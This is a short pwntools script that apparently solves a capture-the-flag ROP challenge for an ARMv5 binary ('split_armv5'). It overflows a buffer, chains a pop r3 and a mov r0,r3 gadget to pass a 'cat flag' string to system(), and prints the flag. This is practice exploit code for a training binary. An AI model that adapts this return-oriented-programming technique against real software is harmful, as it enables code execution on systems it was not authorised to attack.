from pwn import *

system = 0x000105e0
cat_flag = 0x0002103c
mov_r0_r3 = 0x00010558
pop_r3 = 0x000103a4

payload = b"".join([
    b"A"*(32+4),
    p32(pop_r3),
    p32(cat_flag),
    p32(mov_r0_r3),
    b"B"*4,
    p32(system),
])

#p = process(["qemu-arm", "-g", "1234", "./split_armv5"])
p = process("./split_armv5")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
